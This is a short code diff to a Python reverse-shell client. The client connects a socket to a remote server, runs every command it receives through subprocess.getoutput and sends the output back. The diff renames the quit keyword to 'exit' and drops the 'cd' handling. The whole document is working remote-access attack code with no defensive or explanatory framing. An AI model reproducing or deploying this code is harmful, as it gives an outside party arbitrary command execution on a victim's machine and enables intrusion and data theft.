@@ -8,11 +8,8 @@ s = socket.socket()
 s.connect((sever,port))
 while True:
     command = s.recv(buffer).decode()
-    if command.lower() == "quit":
+    if command.lower() == "exit":
         break
-    if command.split()[0] == "cd":
-        os.chdir(command.split()[1])
-    else:
-        output = subprocess.getoutput(command)
-        s.send(output.encode())
+    output = subprocess.getoutput(command)
+    s.send(output.encode())
 s.close()
